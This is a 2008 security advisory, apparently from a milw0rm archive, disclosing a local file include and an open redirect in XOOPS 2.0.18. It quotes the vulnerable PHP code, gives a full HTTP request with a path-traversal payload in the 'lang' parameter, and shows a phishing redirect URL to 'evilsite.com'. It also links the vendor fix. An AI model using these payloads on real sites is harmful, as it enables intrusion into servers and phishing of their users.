@@ -1,0 +1,130 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-009
+
+
+Application:                    XOOPS
+Versions Affected:              XOOPS 2.0.18
+Vendor URL:                     http://www.xoops.org/
+Bugs:                           Local File Include,URL Redirecting  phishing
+Exploits:                       YES
+Reported:                       28.01.2008
+Vendor response:                28.01.2008
+Date of Public Advisory:        04.02.2008
+Authors:                        Alexandr Polyakov, Stas Svistunovich
+                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+
+
+Description
+***********
+
+XOOPS system has multiple security vulnerabilities:
+
+1. Local File Include
+2. Url redirection Phishing
+
+
+Details
+*******
+
+
+1. Local File Include
+Attacker can inject PHP code and execute OS commands with webserver user privileges
+
+vulnerable script htdocs/install/index.php  vulnerable POST parameter lang
+
+
+
+vulnerable code:
+
+************************************************
+
+
+
+$language = 'english';
+if ( !empty($_POST['lang']) ) {
+    $language = $_POST['lang'];
+.
+.
+.
+.
+
+
+
+if ( file_exists("./language/".$language."/install.php") ) {
+    include_once "./language/".$language."/install.php";
+
+
+************************************************
+
+
+
+
+
+
+
+
+
+Example:
+
+
+POST /xoops-2.0.18/htdocs/install/index.php HTTP/1.0
+Cookie: install_lang=english; lang=russian; PHPSESSID=p113cjpff5dkrkoka01al18kk5; dk_sid=sfa6hlhn75pobg6kqe5m8p30j1
+Content-Length: 67
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost/xoops-2.0.18/htdocs/install/index.php
+
+lang=/../../../../../../../../boot.ini%00.html&op=start&submit=Next
+
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------------
+
+
+2. URL Redirection phishing 
+
+Vulnerability found in script htdocs/user.php?xoops_redirect in post parameter name "xoops_redirect" 
+
+
+Example:
+
+http://[server]/[installdir]/htdocs/user.php?xoops_redirect=http://evilsite.com 
+
+
+
+Fix Information
+***************
+
+
+Vendor  fix this flaw in svn on 28.10.2007.
+
+http://xoops.svn.sourceforge.net/viewvc/xoops?view=rev&revision=1282
+
+Tracker: http://sourceforge.net/tracker/index.php?func=detail&atid=430840&aid=1881236&group_id=41586
+
+
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-02-04]
